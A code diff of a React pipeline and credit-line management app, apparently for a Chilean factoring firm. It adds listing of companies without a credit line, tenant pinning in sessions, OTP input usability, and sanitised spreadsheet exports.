+  const EST_COL = { "En gestión": { bg: "#eff6ff", fg: "#2563EB" }, "En análisis de Riesgo": { bg: "#FFF7ED", fg: "#C2410C" }, "En comité": { bg: "#f5f3ff", fg: "#7C3AED" }, "Aprobada": { bg: "#F0FDF4", fg: "#16A34A" }, "Observada": { bg: "#fef2f2", fg: "#EF4444" } };
   return (
     <div className="rounded-2xl p-3" style={{ backgroundColor: "#fff", border: `1px solid ${C.line}` }}>
       <div className="flex items-center justify-between">
@@ -14521,16 +17290,34 @@ function LineasView({ soloExec, usuario }) {
   const refrescarConCarga = () => { if (refrescando) return; setRefrescando(true); setTimeout(() => { refrescarEstados(); setRefrescando(false); }, 700); };
   const recASubtipo = (rec) => rec === "Aumentar línea" ? { tipo: "modificar", subtipo: "agregar_credito" } : rec === "Revisar / ampliar" ? { tipo: "modificar", subtipo: "ratificar_exceso" } : (rec === "Sujeto a aprobación" || rec === "Bloquear línea") ? { tipo: "modificar", subtipo: "rebajar_linea" } : { tipo: "renovar", subtipo: null };
   const conSolicitud = new Set(api2ListarProcesos().map((s) => s.lineaId).filter(Boolean));
-  const rows0 = LINEAS_DATA.filter((l) => !soloExec || l.exec === soloExec).map((l) => ({ ...l, rec: lineaRecomendacion(l), salud: lineaSalud(l) }));
+  // El listado muestra TODA la cartera, no sólo las empresas que ya tienen línea: una empresa sin línea
+  // no puede operar, y esa ausencia es justamente el trabajo del ejecutivo. Antes esas empresas no
+  // aparecían en ningún lado y la única puerta para crear una línea estaba escondida en «En proceso».
+  const porRut = lineaIdxPorRut() || new Map();
+  const rows0 = PC_CLIENTES.filter((c) => !soloExec || c.ej === soloExec).map((c) => {
+    const l = porRut.get(c.rut);
+    if (l) return { ...l, sinLinea: false, rec: lineaRecomendacion(l), salud: lineaSalud(l) };
+    return {
+      id: "SL-" + c.id, cliente: c.nombre, rut: c.rut, exec: c.ej, zona: c.zona, sinLinea: true,
+      aprobada: 0, uso: 0, disponible: 0, montoOp: 0, proyeccion: 0, demandaBuenos: 0, morosidadDias: 0,
+      sowActual: c.sow || 0, sowTarget: c.target || 60,
+      rec: { tipo: "Sin línea", color: "#6B7280", bg: "#F3F4F6", texto: "La empresa no tiene línea de crédito aprobada: no puede cursar operaciones. Presentar una línea nueva al comité." },
+      salud: { label: "Sin línea", color: "#9CA3AF" },
+    };
+  });
+  const conLinea = rows0.filter((l) => !l.sinLinea);
   const rows = rows0.filter((l) => (!q || l.cliente.toLowerCase().includes(q.toLowerCase()) || l.rut.includes(q)) && (fSalud === "todos" || l.salud.label === fSalud));
-  const totalAprob = rows0.reduce((s, l) => s + l.aprobada, 0), totalUso = rows0.reduce((s, l) => s + l.uso, 0);
-  const aumentos = rows0.filter((l) => l.rec.tipo === "Aumentar línea").length, morosos = rows0.filter((l) => l.morosidadDias > 0).length;
+  const totalAprob = conLinea.reduce((s, l) => s + l.aprobada, 0), totalUso = conLinea.reduce((s, l) => s + l.uso, 0);
+  const aumentos = conLinea.filter((l) => l.rec.tipo === "Aumentar línea").length, morosos = conLinea.filter((l) => l.morosidadDias > 0).length;
+  const nSinLinea = rows0.length - conLinea.length;
+  const abrirNueva = (l) => setWiz({ nueva: true, cliente: l.cliente, rut: l.rut });
   const cols = ["Cliente", "Línea aprobada", "Uso actual", "Disponible", "Proyección post-curse", "Recomendación", "Salud", "Acciones"];
   const kpis = [
-    { t: "Líneas", v: rows0.length.toLocaleString("es-CL"), s: "clientes con línea aprobada", col: C.ink, bg: "#fff", bd: C.line },
-    { t: "Línea total aprobada", v: fmtMM(totalAprob), s: `uso ${Math.round(totalUso / totalAprob * 100)}% · disponible ${fmtMM(totalAprob - totalUso)}`, col: "#703EFF", bg: "#f5f3ff", bd: "#ddd6fe" },
+    { t: "Líneas", v: conLinea.length.toLocaleString("es-CL"), s: "clientes con línea aprobada", col: C.ink, bg: "#fff", bd: C.line },
+    { t: "Sin línea", v: nSinLinea.toLocaleString("es-CL"), s: "empresas que no pueden cursar hasta tener línea", col: "#6B7280", bg: "#F9FAFB", bd: C.line },
+    { t: "Línea total aprobada", v: fmtMM(totalAprob), s: `uso ${totalAprob ? Math.round(totalUso / totalAprob * 100) : 0}% · disponible ${fmtMM(totalAprob - totalUso)}`, col: "#703EFF", bg: "#f5f3ff", bd: "#ddd6fe" },
     { t: "Aumentos recomendados", v: aumentos.toLocaleString("es-CL"), s: "buenos deudores sin financiar · afectan SOW", col: "#2563EB", bg: "#eff6ff", bd: "#bfdbfe" },
-    { t: "Con morosidad", v: morosos.toLocaleString("es-CL"), s: "evaluar reducción / bloqueo / aprobación", col: "#dc2626", bg: "#fef2f2", bd: "#fecaca" },
+    { t: "Con morosidad", v: morosos.toLocaleString("es-CL"), s: "evaluar reducción / bloqueo / aprobación", col: "#EF4444", bg: "#fef2f2", bd: "#fecaca" },
   ];
   // Wizard de presentación al comité: vista standalone que REEMPLAZA el contenido de Líneas (no es modal)
   if (wiz && (wiz.linea || wiz.cliente)) return (
@@ -14552,10 +17339,10 @@ function LineasView({ soloExec, usuario }) {
             <button key={k} onClick={() => setSub(k)} className="flex items-center gap-1.5 px-1 pb-2 t12" style={{ borderBottom: `2px solid ${sub === k ? C.indigo : "transparent"}`, color: sub === k ? C.indigo : C.sub, fontWeight: sub === k ? 600 : 400, marginBottom: -1 }}><Ic size={13} /> {l}</button>
           ))}
         </div>
-        <div className="t9" style={{ color: C.faint }}>Última carga CSV (SFTP): hoy 06:15 · Montos actualizados vía API: {new Date().getHours()}:00 · Para modificar/renovar, haz clic en una línea; las líneas nuevas se crean en «En proceso».</div>
+        <div className="t9" style={{ color: C.faint }}>Última carga CSV (SFTP): hoy 06:15 · Montos actualizados vía API: {new Date().getHours()}:00 · Haz clic en una fila para modificar/renovar; en las empresas <b>sin línea</b> el mismo clic abre la solicitud de línea nueva.</div>
       </div>
       {sub === "vigentes" && (<>
-      <div className="grid grid-cols-2 gap-2 md:grid-cols-4">
+      <div className="grid grid-cols-2 gap-2 md:grid-cols-3 xl:grid-cols-5">
         {kpis.map((k, i) => (
           <div key={i} className="rounded-xl p-3" style={{ backgroundColor: k.bg, border: `1px solid ${k.bd}` }}>
             <div className="t9 font-bold uppercase tracking-wide" style={{ color: k.col }}>{k.t}</div>
@@ -14568,7 +17355,7 @@ function LineasView({ soloExec, usuario }) {
         <div className="flex items-center gap-1.5 rounded-full px-3 py-1.5" style={{ border: `1px solid ${C.line}`, backgroundColor: "#fff" }}>
           <Search size={13} style={{ color: C.faint }} /><input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Buscar cliente o RUT…" className="w-52 bg-transparent t12 outline-none" style={{ color: C.ink }} />
         </div>
-        {["todos", "Saludable", "Subutilizada", "Atención", "En riesgo", "Crítica"].map((k) => (
+        {["todos", "Sin línea", "Saludable", "Subutilizada", "Atención", "En riesgo", "Crítica"].map((k) => (
           <button key={k} onClick={() => setFSalud(k)} className="rounded-lg px-3 py-1.5 t11 font-medium" style={{ border: `1px solid ${fSalud === k ? C.indigo : C.line}`, backgroundColor: fSalud === k ? C.indigo : "#fff", color: fSalud === k ? "#fff" : C.ink }}>{k === "todos" ? "Todas" : k}</button>
         ))}
       </div>
@@ -14576,27 +17363,39 @@ function LineasView({ soloExec, usuario }) {
         <table className="w-full border-collapse t11" style={{ minWidth: "1160px" }}>
           <thead><tr>{cols.map((h) => <th key={h} className="px-3 py-2.5 text-left t9 font-bold uppercase tracking-wide" style={{ color: C.faint, borderBottom: `1px solid ${C.line}` }}>{h}</th>)}</tr></thead>
           <tbody>
-            {rows.map((l) => { const base = Math.max(l.proyeccion, l.aprobada) || 1; const fuera = l.proyeccion > l.aprobada; const enCurso = conSolicitud.has(l.id); return (
-              <tr key={l.id} onClick={() => { if (!enCurso) { const rs = recASubtipo(l.rec.tipo); setWiz({ linea: l, tipo: rs.tipo, subtipo: rs.subtipo }); } }} className="cursor-pointer hover:bg-stone-50" title={enCurso ? "Esta línea ya tiene una solicitud en gestión (ver «En proceso»)" : "Iniciar solicitud de modificación / renovación de esta línea"} style={{ borderBottom: `1px solid ${C.line}`, opacity: enCurso ? 0.6 : 1 }}>
+            {rows.map((l) => { const base = Math.max(l.proyeccion, l.aprobada) || 1; const fuera = !l.sinLinea && l.proyeccion > l.aprobada; const enCurso = conSolicitud.has(l.id);
+              // Guion de la celda vacía: en una empresa sin línea no hay 0, hay AUSENCIA de línea.
+              const vacio = <span className="t11" style={{ color: C.faint }}>—</span>;
+              return (
+              <tr key={l.id} onClick={() => { if (enCurso) return; if (l.sinLinea) { abrirNueva(l); return; } const rs = recASubtipo(l.rec.tipo); setWiz({ linea: l, tipo: rs.tipo, subtipo: rs.subtipo }); }} className="cursor-pointer hover:bg-stone-50" title={enCurso ? "Esta línea ya tiene una solicitud en gestión (ver «En proceso»)" : l.sinLinea ? "Presentar una línea nueva al comité para esta empresa" : "Iniciar solicitud de modificación / renovación de esta línea"} style={{ borderBottom: `1px solid ${C.line}`, opacity: enCurso ? 0.6 : 1 }}>
                 <td className="px-3 py-2.5"><div className="t12 font-medium" style={{ color: C.ink }}>{l.cliente}{enCurso && <span className="ml-1.5 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: "#f5f3ff", color: "#7C3AED" }}>Solicitud en curso</span>}</div><div className="t9" style={{ color: C.faint }}>{l.rut} · {l.exec}</div></td>
-                <td className="whitespace-nowrap px-3 py-2.5 t11 font-semibold" style={{ color: C.ink }}>{fmtMM(l.aprobada)}</td>
-                <td className="whitespace-nowrap px-3 py-2.5 t11" style={{ color: C.sub }}>{fmtMM(l.uso)} <span className="t9" style={{ color: C.faint }}>({Math.round(l.uso / l.aprobada * 100)}%)</span></td>
-                <td className="whitespace-nowrap px-3 py-2.5 t11 font-medium" style={{ color: l.disponible > 0 ? "#16A34A" : "#dc2626" }}>{fmtMM(l.disponible)}</td>
+                <td className="whitespace-nowrap px-3 py-2.5 t11 font-semibold" style={{ color: l.sinLinea ? C.faint : C.ink }}>{l.sinLinea ? "Sin línea" : fmtMM(l.aprobada)}</td>
+                <td className="whitespace-nowrap px-3 py-2.5 t11" style={{ color: C.sub }}>{l.sinLinea ? vacio : <>{fmtMM(l.uso)} <span className="t9" style={{ color: C.faint }}>({Math.round(l.uso / l.aprobada * 100)}%)</span></>}</td>
+                <td className="whitespace-nowrap px-3 py-2.5 t11 font-medium" style={{ color: l.sinLinea ? C.faint : (l.disponible > 0 ? "#16A34A" : "#EF4444") }}>{l.sinLinea ? vacio : fmtMM(l.disponible)}</td>
                 <td className="px-3 py-2.5" style={{ minWidth: 180 }}>
-                  <div className="t10 font-semibold" style={{ color: fuera ? "#dc2626" : C.ink }}>{fmtMM(l.proyeccion)} <span style={{ color: C.faint }}>/ {fmtMM(l.aprobada)}</span></div>
+                  {l.sinLinea ? vacio : (<>
+                  <div className="t10 font-semibold" style={{ color: fuera ? "#EF4444" : C.ink }}>{fmtMM(l.proyeccion)} <span style={{ color: C.faint }}>/ {fmtMM(l.aprobada)}</span></div>
                   <div className="relative mt-1 h-2 w-full rounded-full" style={{ backgroundColor: C.page }}>
                     <div className="absolute left-0 top-0 h-2 rounded-l-full" style={{ width: Math.min(100, l.uso / base * 100) + "%", backgroundColor: "#9ca3af" }} />
-                    <div className="absolute top-0 h-2" style={{ left: (l.uso / base * 100) + "%", width: (l.montoOp / base * 100) + "%", backgroundColor: fuera ? "#dc2626" : "#8A63FF" }} />
+                    <div className="absolute top-0 h-2" style={{ left: (l.uso / base * 100) + "%", width: (l.montoOp / base * 100) + "%", backgroundColor: fuera ? "#EF4444" : "#8A63FF" }} />
                     <span style={{ position: "absolute", left: (l.aprobada / base * 100) + "%", top: -1, width: 2, height: 10, backgroundColor: C.ink }} />
                   </div>
-                  {fuera && <div className="mt-0.5 t9 font-semibold" style={{ color: "#dc2626" }}>Fuera de línea +{fmtMM(l.proyeccion - l.aprobada)}</div>}
+                  {fuera && <div className="mt-0.5 t9 font-semibold" style={{ color: "#EF4444" }}>Fuera de línea +{fmtMM(l.proyeccion - l.aprobada)}</div>}
+                  </>)}
                 </td>
                 <td className="px-3 py-2.5" style={{ minWidth: 300, maxWidth: 340 }}>
-                  <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t10 font-bold" style={{ backgroundColor: l.rec.bg, color: l.rec.color }}>{(l.rec.tipo === "Bloquear línea" || l.rec.tipo === "Sujeto a aprobación") ? <AlertTriangle size={11} /> : l.rec.tipo === "Aumentar línea" ? <ArrowUpRight size={11} /> : <Check size={11} />}{l.rec.tipo}</span>
+                  <span className="inline-flex items-center gap-1 rounded-full px-2 py-0.5 t10 font-bold" style={{ backgroundColor: l.rec.bg, color: l.rec.color }}>{l.sinLinea ? <Plus size={11} /> : (l.rec.tipo === "Bloquear línea" || l.rec.tipo === "Sujeto a aprobación") ? <AlertTriangle size={11} /> : l.rec.tipo === "Aumentar línea" ? <ArrowUpRight size={11} /> : <Check size={11} />}{l.rec.tipo}</span>
                   <div className="mt-1 t9" style={{ color: C.sub, lineHeight: 1.4 }}>{l.rec.texto}</div>
                 </td>
                 <td className="whitespace-nowrap px-3 py-2.5"><span className="inline-flex items-center gap-1.5 t10 font-semibold" style={{ color: l.salud.color }}><span className="h-2.5 w-2.5 rounded-full" style={{ backgroundColor: l.salud.color }} />{l.salud.label}</span></td>
                 <td className="whitespace-nowrap px-3 py-2.5" onClick={(e) => e.stopPropagation()}>
+                  {l.sinLinea ? (
+                    // Sin línea no hay nada que renovar ni modificar: la única acción posible es crearla,
+                    // y por eso el botón no despliega menú — va derecho al wizard de línea nueva.
+                    <button onClick={() => abrirNueva(l)} className="flex items-center gap-1 rounded-lg px-2.5 py-1.5 t11 font-semibold text-white" style={{ backgroundColor: C.indigo }} title="Presentar una línea nueva al comité">
+                      <Plus size={12} /> Nueva línea
+                    </button>
+                  ) : (
                   <div className="relative inline-block">
                     <button disabled={enCurso} onClick={() => setAccOpen(accOpen === l.id ? null : l.id)}
                       className="flex items-center gap-1 rounded-lg px-2.5 py-1.5 t11 font-semibold disabled:opacity-40"
@@ -14611,10 +17410,11 @@ function LineasView({ soloExec, usuario }) {
                       </div>
                     )}
                   </div>
+                  )}
                 </td>
               </tr>
             ); })}
-            {rows.length === 0 && <tr><td colSpan={cols.length} className="px-3 py-8 text-center t11" style={{ color: C.faint }}>Sin líneas para el filtro.</td></tr>}
+            {rows.length === 0 && <tr><td colSpan={cols.length} className="px-3 py-8 text-center t11" style={{ color: C.faint }}>Sin empresas para el filtro.</td></tr>}
           </tbody>
         </table>
       </div>
@@ -14828,7 +17628,9 @@ function verificarCredenciales(email, clave) {
 let SESION = null;
 function abrirSesion(code, via) {
   const ahora = Date.now();
-  SESION = { usuario: code, via, iniciada: ahora, expira: ahora + SESION_ABSOLUTA_MS, actividad: ahora };
+  // El tenant queda FIJADO al abrir la sesión: si después cambia el tenant activo sin volver a
+  // autenticar, el contrato (TEN-01) rechaza toda mutación en vez de escribir en la tabla equivocada.
+  SESION = { usuario: code, via, tenant: TENANT_ACTUAL, iniciada: ahora, expira: ahora + SESION_ABSOLUTA_MS, actividad: ahora };
   logSys("info", "app", `Sesión iniciada · ${USERS[code] || code} (${via})`, { usuario: code, via, expiraEn: SESION_ABSOLUTA_MS });
   registrarAuditoria({ usuario: USERS[code] || code, modulo: "Autenticación", accion: "Inicio de sesión", glosa: `Ingreso exitoso vía ${via}`, exito: true });
   return SESION;
@@ -14875,29 +17677,55 @@ function LoginScreen({ usuarioInicial, onIngresar }) {
       return;
     }
     setU(r.code);
-    const code = emitirOtp("login:" + String(email).toLowerCase());
+    const code = await emitirOtp("login:" + String(email).toLowerCase());
     setOtpDemo(code); setOtp(["", "", "", "", "", ""]); setOtpIntentos(0); setPaso("otp");
   };
   // Paso 2: validar el código. Se consume (un solo uso) y a los 3 fallos vuelve a credenciales.
-  const verificarOtp = () => {
-    const v = validarOtp("login:" + String(email).toLowerCase(), otp.join(""));
+  const verificarOtp = async () => {
+    const v = await validarOtp("login:" + String(email).toLowerCase(), otp.join(""));
     if (!v.ok) {
       const n = otpIntentos + 1; setOtpIntentos(n);
       logSys("warn", "app", `Código 2FA inválido (${v.error})`, { cuenta: String(email).toLowerCase(), intento: n });
       if (n >= AUTH_OTP_MAX) { setError("Demasiados intentos con el código. Vuelve a ingresar tus credenciales."); setPaso("cred"); return; }
       // El OTP se consume al validarlo; si fue incorrecto hay que emitir uno nuevo para reintentar.
-      setOtpDemo(emitirOtp("login:" + String(email).toLowerCase()));
+      setOtpDemo(await emitirOtp("login:" + String(email).toLowerCase()));
       setOtp(["", "", "", "", "", ""]);
       setError(`${v.error}. Te enviamos un código nuevo.`);
       return;
     }
     authExito(email); abrirSesion(u, "credenciales + 2FA"); onIngresar(u);
   };
+  // Cada casilla del código es un input distinto, así que el foco lo tiene que mover la UI: al digitar
+  // salta a la siguiente, con Backspace sobre una casilla vacía vuelve a la anterior, y pegar el código
+  // completo lo reparte entre las seis. Sin esto hay que hacer clic seis veces para escribir un OTP.
+  const otpRefs = useRef([]);
+  const focoOtp = (i) => { const el = otpRefs.current[i]; if (el) { el.focus(); el.select(); } };
   const setOtpDigito = (i, val) => {
     const d = String(val || "").replace(/\D/g, "").slice(-1);
     setOtp((prev) => { const n = prev.slice(); n[i] = d; return n; });
     setError(null);
+    if (d && i < OTP_LARGO - 1) focoOtp(i + 1);
   };
+  const otpTecla = (i, e) => {
+    if (e.key === "Backspace") {
+      // Con la casilla ya vacía, Backspace retrocede y borra la anterior (comportamiento estándar de OTP).
+      if (!otp[i] && i > 0) { e.preventDefault(); setOtp((prev) => { const n = prev.slice(); n[i - 1] = ""; return n; }); focoOtp(i - 1); }
+      return;
+    }
+    if (e.key === "ArrowLeft" && i > 0) { e.preventDefault(); focoOtp(i - 1); }
+    else if (e.key === "ArrowRight" && i < OTP_LARGO - 1) { e.preventDefault(); focoOtp(i + 1); }
+    else if (e.key === "Enter" && otp.every((d) => d)) { verificarOtp(); }
+  };
+  const otpPegar = (i, e) => {
+    const txt = String((e.clipboardData || window.clipboardData).getData("text") || "").replace(/\D/g, "");
+    if (!txt) return;
+    e.preventDefault();
+    setOtp((prev) => { const n = prev.slice(); for (let k = 0; k < txt.length && i + k < OTP_LARGO; k++) n[i + k] = txt[k]; return n; });
+    setError(null);
+    focoOtp(Math.min(i + txt.length, OTP_LARGO - 1));
+  };
+  // Al llegar al paso 2FA el cursor ya queda en la primera casilla.
+  useEffect(() => { if (paso === "otp") focoOtp(0); }, [paso]);
   // Cuentas del tenant Entra ID de la organización (mock del App Service Authentication /.auth/login/aad)
   const CUENTAS_MS = [
     { key: "CR", nombre: "Carla Rivas", mail: "carla.rivas@factoringsecurity.cl" },
@@ -14984,7 +17812,7 @@ function LoginScreen({ usuarioInicial, onIngresar }) {
               {otp.map((d, i) => (
                 <Fragment key={i}>
                   {i === 3 && <span style={{ width: 10, height: 1.5, backgroundColor: "#D1D5DB", flexShrink: 0 }} />}
-                  <input maxLength={1} inputMode="numeric" value={d} onChange={(e) => setOtpDigito(i, e.target.value)} className="text-center" style={{ width: 46, height: 52, fontSize: 20, fontWeight: 600, color: C.ink, border: `1px solid ${C.line}`, borderRadius: 10, backgroundColor: "#fff", outline: "none" }} />
+                  <input ref={(el) => { otpRefs.current[i] = el; }} maxLength={1} inputMode="numeric" autoComplete="one-time-code" aria-label={`Dígito ${i + 1} de ${OTP_LARGO}`} value={d} onChange={(e) => setOtpDigito(i, e.target.value)} onKeyDown={(e) => otpTecla(i, e)} onPaste={(e) => otpPegar(i, e)} onFocus={(e) => e.target.select()} className="text-center" style={{ width: 46, height: 52, fontSize: 20, fontWeight: 600, color: C.ink, border: `1px solid ${d ? C.indigo : C.line}`, borderRadius: 10, backgroundColor: "#fff", outline: "none" }} />
                 </Fragment>
               ))}
             </div>
@@ -15004,7 +17832,7 @@ function LoginScreen({ usuarioInicial, onIngresar }) {
       {/* Panel de marca del tenant: logotipo arriba, claim al centro y «powered by» al pie. Gradiente,
           textos y logo salen de la configuración del factoring — dar de alta uno nuevo no toca código. */}
       <div className="mt-6 mr-6 mb-12 ml-3 flex flex-1 flex-col justify-between overflow-hidden p-12" style={{ borderRadius: 20, background: CFG_ACTIVA.marcaPanel }}>
-        <div className="flex justify-center"><Marca tono="claro" /></div>
+        <div className="flex justify-start"><Marca tono="claro" /></div>
         <div className="text-white" style={{ maxWidth: 560 }}>
           <div style={{ fontSize: 30, fontWeight: 700, lineHeight: 1.25 }}>{CFG_ACTIVA.marcaClaim}</div>
           <div className="mt-3" style={{ fontSize: 14, opacity: 0.92 }}>{CFG_ACTIVA.marcaBajada}</div>
@@ -15059,7 +17887,12 @@ function definirWebComponent(React, ReactDOM, App) {
       let params = {};
       try { params = JSON.parse(this.getAttribute("parameters") || "{}") || {}; }
       catch (e) { logSys("warn", "app", `El atributo «parameters» no es JSON válido: se ignoró (${e && e.message})`); }
-      if (params.tenant && TENANTS.some((t) => t.id === params.tenant)) { TENANT_ACTUAL = params.tenant; aplicarCfgActiva((cargarCfgOper() || {})[TENANT_ACTUAL]); }
+      if (params.tenant && TENANTS.some((t) => t.id === params.tenant)) {
+        TENANT_ACTUAL = params.tenant;
+        aplicarCfgActiva((cargarCfgOper() || {})[TENANT_ACTUAL]);
+        reapuntarRepos(); // sin esto los alias siguen leyendo la tabla del tenant anterior
+        logSys("info", "app", `Tenant fijado desde el host: ${TENANT_ACTUAL} · repositorios reapuntados`, { tenant: TENANT_ACTUAL });
+      }
       // Modo de montaje: shadow sólo con hoja precompilada (ver la nota de arriba).
       const cssPrecompilado = (typeof window !== "undefined" && window.__NEX_CSS__) || null;
       let destino = this;
@@ -15143,6 +17976,12 @@ export default function PipelineComercial() {
     window.addEventListener("keydown", h); return () => window.removeEventListener("keydown", h);
   }, []);
   const [solicOpen, setSolicOpen] = useState(false); // bandeja lateral de requerimientos de información
+  // Selección que viaja del Dashboard a Clientes / Tareas. Objeto nuevo en cada clic (el contador `n`)
+  // para que la vista destino reaplique el filtro aunque el usuario lo haya cambiado a mano.
+  // null = sin selección heredada. Las guardas `sel && sel.f` / `selTipo && selTipo.tipo` de las vistas
+  // ya saben leerlo, así que el reset es simplemente volver a null.
+  const [selClientes, setSelClientes] = useState(null);
+  const [selTareas, setSelTareas] = useState(null);
   const [prioOpen, setPrioOpen] = useState(false); // panel lateral de oportunidades con prioridad de curse
   const [, setNotifTick] = useState(0); // re-render al responder/leer requerimientos
   const [dealTabInicial, setDealTabInicial] = useState(null); // pestaña inicial al abrir una operación (p. ej. "mensajeria")
@@ -15163,7 +18002,13 @@ export default function PipelineComercial() {
   const ofOtrasVisible = (ev) => esEjecutivoSesion ? (ev.esCliente && asignarEjecutivo(ev) === usuario) : !ev.esCliente;
   const [vistaApp, setVistaApp] = useState("dashboard"); // vista principal in-page; aterriza en el Dashboard tras login
   // Navega a un módulo y registra la acción del usuario en la auditoría (con su nombre).
-  const irA = (v, label) => { setVistaApp(v); registrarAuditoria({ usuario: USERS[usuario], modulo: label, accion: "Ingreso al módulo", glosa: `El usuario ingresó al módulo ${label}`, exito: true }); };
+  const irA = (v, label) => {
+    setVistaApp(v);
+    // Navegar por el menú limpia cualquier selección heredada del Dashboard: si no, volver a Clientes
+    // desde la barra reaplicaba el último filtro pinchado en una card, sin que el usuario lo pidiera.
+    setSelClientes(null); setSelTareas(null);
+    registrarAuditoria({ usuario: USERS[usuario], modulo: label, accion: "Ingreso al módulo", glosa: `El usuario ingresó al módulo ${label}`, exito: true });
+  };
   const [cfgVer, setCfgVer] = useState(0); // fuerza re-render al editar catálogos de Mantenedores
   const [vista, setVista] = useState("tabla"); // "kanban" | "tabla" | "tamaño" — por defecto carga en tabla
   const [vistaMenu, setVistaMenu] = useState(false); // dropdown selector de vista del tubo
@@ -15190,7 +18035,7 @@ export default function PipelineComercial() {
   const [historia, setHistoria] = useState([]); // snapshots de conteo por etapa (para sparklines)
   const [reporte, setReporte] = useState([]); // estadísticas por día
   const [diaModal, setDiaModal] = useState(null); // modal de cierre de día (aceptación)
-  const [reporteModal, setReporteModal] = useState(false); // modal de reporte semanal
+  const [finSetModal, setFinSetModal] = useState(false); // aviso de «se acabó el set de datos de prueba»
   const [wizardOpen, setWizardOpen] = useState(false); // wizard de "Nuevo negocio"
   const [wizardDeal, setWizardDeal] = useState(null); // deal en modo "incorporar facturas"
   const [filtrosAvOpen, setFiltrosAvOpen] = useState(false); // modal de filtros avanzados (Deudor / Jefatura / Línea)
@@ -15211,7 +18056,6 @@ export default function PipelineComercial() {
   const noClasRef = useRef({ porPerfil: {}, porCedente: {}, total: 0, montoTotal: 0 }); // backlog de no clasificadas
   const reglaStatsRef = useRef({}); // performance por regla (capturas)
   const deudorStatsRef = useRef({ buenos: { fac: 0, mm: 0 }, autorizados: { fac: 0, mm: 0 }, otros: { fac: 0, mm: 0 } }); // lista blanca / autorizados / otros
-  const [analisis, setAnalisis] = useState(null); // análisis/recomendación de fin de semana
   const [editingRule, setEditingRule] = useState(null);
   const [streaming, setStreaming] = useState(false); // arranca detenido: la simulación inbound parte al presionar Start
   // Sin modo demo no hay stream simulado que mostrar: la columna Inbound arranca oculta y su toggle
@@ -15298,6 +18142,12 @@ export default function PipelineComercial() {
   // Pipeline = oportunidades previas a ser aceptadas (Prospección + Oferta/Negociación), no rechazadas.
   const totalPipeline = useMemo(() => dealsVista.filter((d) => d.stage === "prospeccion" || d.stage === "oferta").reduce((s, d) => s + d.amountMM, 0), [dealsVista]);
   const activeCount = useMemo(() => dealsVista.filter((d) => d.stage !== "perdida").length, [dealsVista]);
+  // Pulso del tubo para el mini gráfico del KPI. `kpiHist` sólo agrega un punto al CERRAR el día, así
+  // que en una demo normal nunca junta dos y el gráfico no llegaba a dibujarse: ese era el espacio
+  // vacío. `historia` en cambio se muestrea cada 2 s, y es la evolución que el ejecutivo reconoce.
+  const serieOport = useMemo(
+    () => (historia || []).map((h) => STAGES.reduce((n, s) => n + (s.id === "perdida" ? 0 : (h[s.id] || 0)), 0)).slice(-10),
+    [historia]);
   // Venta mensual = facturas en Giro: Girado.
   const ventaMensualMM = useMemo(() => dealsVista.filter((d) => d.stage === "giro" && subEstadoDe(d) === "girado").reduce((s, d) => s + d.amountMM, 0), [dealsVista]);
   const vsBudget = BUDGET_MES_MM ? +(ventaMensualMM / BUDGET_MES_MM * 100).toFixed(1) : 0;
@@ -15332,7 +18182,7 @@ export default function PipelineComercial() {
   const exportarCasos = (id) => {
     const rows = casosDe(id);
     const headers = ["ID", "Cliente", "Deudor", "Sector", "Etapa", "Facturas", "Monto_MM", "Tasa", "Dias_fin", "Giro_MM", "Desc_MM", "Comision_CLP", "Ejecutivo", "Estado", "Vencimiento"];
-    const esc = (v) => `"${String(v == null ? "" : v).replace(/"/g, '""')}"`;
+    const esc = (v) => `"${String(celdaSegura(v)).replace(/"/g, '""')}"`;
     const lineas = rows.map((d) => [d.id, d.cliente, d.deudor, d.sector, (STAGES.find((s) => s.id === d.stage)?.name || d.stage), d.facturas, d.amountMM, d.tasa, d.diasFin, d.giroMM, d.descMM, d.comision, (EXECS[d.exec] || d.exec), d.status, d.fechaVenc].map(esc).join(";"));
     const csv = String.fromCharCode(0xFEFF) + [headers.join(";"), ...lineas].join("\n");
     try {
@@ -15351,13 +18201,13 @@ export default function PipelineComercial() {
     const aoa = [headers, ...rows.map((d) => [d.id, d.cliente, (EXECS[d.exec] || d.exec), d.tag, d.amountMM, d.facturas, d.tasa, d.anticipo, d.diasFin, d.giroMM, d.descMM, d.comision, (STAGES.find((s) => s.id === d.stage)?.name || d.stage), d.deudor, d.status])];
     try {
       const XLSX = await cargarXLSX();
-      const ws = XLSX.utils.aoa_to_sheet(aoa);
+      const ws = XLSX.utils.aoa_to_sheet(aoa.map(filaSegura));
       const wb = XLSX.utils.book_new();
       XLSX.utils.book_append_sheet(wb, ws, "Pipeline");
       XLSX.writeFile(wb, "pipeline_comercial.xlsx");
       registrarAuditoria({ usuario: USERS[usuario] || usuario, modulo: "Pipeline", accion: "Exportar", glosa: `Exportó ${rows.length} oportunidades de la grilla a Excel`, exito: true });
     } catch (e) {
-      const esc = (v) => `"${String(v == null ? "" : v).replace(/"/g, '""')}"`;
+      const esc = (v) => `"${String(celdaSegura(v)).replace(/"/g, '""')}"`;
       const csv = String.fromCharCode(0xFEFF) + aoa.map((r) => r.map(esc).join(";")).join("\n");
       try { const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" }); const url = URL.createObjectURL(blob); const a = document.createElement("a"); a.href = url; a.download = "pipeline_comercial.csv"; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url); } catch { /* sin descargas */ }
     }
@@ -15368,11 +18218,20 @@ export default function PipelineComercial() {
   // NUEVA oportunidad en prospección para el mismo cliente con esas facturas.
   const dealPendiente = (d) => {
     const monto = d.nuevasFacturasMontoMM || 0;
+    const nFac = d.nuevasFacturas || 0;
     const nid = `OP-S${Date.now() % 100000}-${(d.id || "").slice(-3)}`;
     return { ...d, id: nid, stage: "prospeccion",
-      facturas: d.nuevasFacturas, amountMM: +monto.toFixed(1), important: monto > 800,
+      facturas: nFac, amountMM: +monto.toFixed(1), important: monto > 800,
+      // El paquete del PADRE no viaja al split: `itemizarFacturas` devuelve `facturasOp` tal cual
+      // cuando existe, así que heredarlo hacía que la nueva oportunidad mostrara los folios y la suma
+      // del padre bajo una cabecera con otro monto. Sin `facturasOp` se re-itemiza desde `deudores`.
+      facturasOp: [], facturasRetiradas: undefined, cedidasOtro: 0,
+      deudores: [{ name: d.deudor, facturas: Math.max(1, nFac), montoMM: +monto.toFixed(1) }],
       status: "Facturas pendientes · nueva oportunidad", time: nowStamp(), warning: false,
